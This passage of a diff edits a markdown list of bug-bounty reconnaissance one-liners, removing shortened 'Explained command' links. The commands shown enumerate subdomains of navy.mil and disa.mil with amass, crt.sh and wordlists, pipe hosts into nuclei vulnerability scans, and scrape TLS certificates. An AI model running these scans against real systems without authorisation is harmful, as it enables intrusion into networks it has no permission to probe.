 amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk '{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-wordlist.txt | sort -u > hosts-all.txt
 ```
 ###  Search domains using amass and search vul to nuclei.
 
-- [Explained command](https://bit.ly/3gsbzNt)
+- [Explained command]
 
 ```bash
 amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | nuclei -t PATH -o result -timeout 30 
@@ -761,7 +769,7 @@ amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent
 
 ###  Verify to cert using openssl.
 
-- [Explained command](https://bit.ly/37avq0C)
+- [Explained command]
 
 ```bash
 sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
@@ -774,7 +782,7 @@ sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
 
 ###  Search domains using openssl to cert.
 
-- [Explained command](https://bit.ly/3m9AsOY)
+- [Explained command]
 
 ```bash
 xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew 
